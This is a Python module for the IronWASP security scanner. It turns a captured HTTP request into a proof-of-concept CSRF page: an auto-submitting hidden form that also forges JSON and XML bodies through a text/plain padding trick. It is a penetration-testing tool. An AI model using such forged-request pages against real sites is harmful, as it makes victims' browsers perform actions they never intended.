from IronWASP import *

class CSRFPOCGenerator(Module):

	def GetInstance(self):
		m = CSRFPOCGenerator()
		m.Name = "CSRFPOCGenerator"
		return m
       
       
	def StartModuleOnSession(self,sess):
		Tools.Trace("POC","StartModuleOnSession method called")
		self.start_ui()
		r = sess.Request
		html = "<html>\n<meta http-equiv='cache-control' content='no-cache'>\n"
		html = html + "<meta http-equiv='pragma' content='no-cache'> \n<body onload=document.test.submit()>\n"
		html = html + "<form name=test "
		if r.Method == 'GET':
			html = html + "action='" + r.BaseUrl + r.UrlPath.lstrip('/') + "' "
		else:
			html = html + "action='" + r.FullUrl + "' "
		html = html + "method='" + r.Method + "' "
    #check for Json or XML   
		if Tools.IsJson(r.BodyString) or Tools.IsXml(r.BodyString):
			html = html + "enctype='text/plain'"
		html = html + ">\n"
       
		if r.Method == "GET":
			for name in r.Query.GetNames():
				html = html + '<input '
				html = html + 'name="' + name + '" '
				html = html + 'value="' + r.Query.Get(name) + '" '
				html = html + 'type=hidden'
				html = html + '>\n'
               
		elif r.Method == "POST":
            #check for Json
			if Tools.IsJson(r.BodyString):
				html = html + '<input '
				html = html + 'name="' + Tools.HtmlEncode(r.BodyString) + Tools.HtmlEncode(',\"ignore_me\":\"') + '" '
				html = html + 'value="' + Tools.HtmlEncode('test\"}') + '" ' 
				html = html + 'type=hidden '
				html = html + '>\n'
            #If Xml Request
			elif Tools.IsXml(r.BodyString):
				body_str = r.BodyString
				count = 0
				html = html + '<input '
				try:
					while body_str[count] != '=':
						count = count + 1
				except IndexError:
					exit
				if count == len(body_str):
					html = html + 'name="' + '<?xml version' + '" '
					html = html + 'value=' + '"' + Tools.HtmlEncode('\"1.0\"?>') + Tools.HtmlEncode(body_str) + '" '
				else:
					substr1 = body_str[0:count]
					substr2 = body_str[count+1:len(body_str)]
					html = html + 'name="' + Tools.HtmlEncode(substr1) + '" '
					html = html + 'value=' + '"' + Tools.HtmlEncode(substr2) + '" '
				html = html + 'type=hidden '
				html = html + '>\n'
            #If normal POST request
			else:
				for name in r.Body.GetNames():
					html = html + '<input '
					html = html + 'name="' + Tools.HtmlEncode(name) + '" '
					html = html + 'value="' + Tools.HtmlEncode(r.Body.Get(name)) + '" '
					html = html + 'type=hidden '
					html = html + '>\n'
		html = html + "<input type='submit' value='CSRF payload will execute now'>\n"
		html = html + "</html>"
		# Save the File
		f_html = open(Config.Path + '\\modules\\CSRFPOCGenerator\\POC.html','w')
		f_html. write(html)
		f_html.close()
		self.ui.ModControls['result'].SetText(html)
        
	def start_ui(self):
		Tools.Trace("POC","start_ui method called")
		self.thread_id = 0
		ui = ModUi()
		ui.Size = ModUiTools.GetSizeDefinition(701,610)
		ui.Text =  Tools.Base64Decode('Q1NSRiBQb0MgR2VuZXJhdG9y')
		mod_label_1 = ModLabel()
		mod_label_1.Name = 'mod_label_1'
		mod_label_1.Size = ModUiTools.GetSizeDefinition(172,23)
		mod_label_1.Location = ModUiTools.GetLocationDefinition(21,76)
		mod_label_1.Anchor = ModUiTools.GetAnchorStyleDefinition(True,False,True,False)
		mod_label_1.Dock = ModUiTools.GetDockStyleDefinition('None')
		mod_label_1.Enabled = True
		mod_label_1.BackColor = ModUiTools.GetColorDefinition(-986896)
		mod_label_1.ForeColor = ModUiTools.GetColorDefinition(-16777216)
		mod_label_1.BorderStyle = ModUiTools.GetBorderStyleDefinition('None')
		mod_label_1.Font = ModUiTools.GetFontDefinition('Microsoft Sans Serif',8.25,False,False,False,False)
		mod_label_1.Text =  Tools.Base64Decode('Q1NSRiBQb0MgY29kZSBpcyBwcmVzZW50IGJlbG93')
		ui.Controls.Add(mod_label_1)
		ui.ModControls['mod_label_1'] = mod_label_1
		result = ModRichTextBox()
		result.Name = 'result'
		result.Size = ModUiTools.GetSizeDefinition(652,455)
		result.Location = ModUiTools.GetLocationDefinition(21,105)
		result.Anchor = ModUiTools.GetAnchorStyleDefinition(True,True,True,True)
		result.Dock = ModUiTools.GetDockStyleDefinition('None')
		result.Enabled = True
		result.BackColor = ModUiTools.GetColorDefinition(-1)
		result.ForeColor = ModUiTools.GetColorDefinition(-16777216)
		result.BorderStyle = ModUiTools.GetBorderStyleDefinition('Fixed3D')
		result.ReadOnly = False
		result.ScrollBars = ModUiTools.GetRichTextBoxScrollBarsDefinition('Both')
		result.Font = ModUiTools.GetFontDefinition('Microsoft Sans Serif',8.25,False,False,False,False)
		result.Multiline = True
		result.WordWrap = True
		result.DetectUrls = True
		ui.Controls.Add(result)
		ui.ModControls['result'] = result
		file_location = ModTextBox()
		file_location.Name = 'file_location'
		file_location.Size = ModUiTools.GetSizeDefinition(448,20)
		file_location.Location = ModUiTools.GetLocationDefinition(187,19)
		file_location.Anchor = ModUiTools.GetAnchorStyleDefinition(True,False,True,False)
		file_location.Dock = ModUiTools.GetDockStyleDefinition('None')
		file_location.Enabled = True
		file_location.BackColor = ModUiTools.GetColorDefinition(-1)
		file_location.ForeColor = ModUiTools.GetColorDefinition(-16777216)
		file_location.BorderStyle = ModUiTools.GetBorderStyleDefinition('Fixed3D')
		file_location.ReadOnly = False
		file_location.ScrollBars = ModUiTools.GetScrollBarsDefinition('None')
		file_location.Font = ModUiTools.GetFontDefinition('Microsoft Sans Serif',8.25,False,False,False,False)
		file_location.Multiline = False
		file_location.WordWrap = True
		file_location.TextAlign = ModUiTools.GetTextAlignDefinition('Left')
		file_location.Text =  Config.Path + '\\modules\\CSRFPOCGenerator\\POC.html'
		ui.Controls.Add(file_location)
		ui.ModControls['file_location'] = file_location
		mod_label_2 = ModLabel()
		mod_label_2.Name = 'mod_label_2'
		mod_label_2.Size = ModUiTools.GetSizeDefinition(172,23)
		mod_label_2.Location = ModUiTools.GetLocationDefinition(21,19)
		mod_label_2.Anchor = ModUiTools.GetAnchorStyleDefinition(True,False,True,False)
		mod_label_2.Dock = ModUiTools.GetDockStyleDefinition('None')
		mod_label_2.Enabled = True
		mod_label_2.BackColor = ModUiTools.GetColorDefinition(-986896)
		mod_label_2.ForeColor = ModUiTools.GetColorDefinition(-16777216)
		mod_label_2.BorderStyle = ModUiTools.GetBorderStyleDefinition('None')
		mod_label_2.Font = ModUiTools.GetFontDefinition('Microsoft Sans Serif',8.25,False,False,False,False)
		mod_label_2.Text =  Tools.Base64Decode('UG9DIGNvZGUgYmVsb3cgaXMgc2F2ZWQgYXQgLT4g')
		ui.Controls.Add(mod_label_2)
		ui.ModControls['mod_label_2'] = mod_label_2
		ui.ShowUi()

		self.ui = ui
                  
m = CSRFPOCGenerator()
Module.Add(m.GetInstance())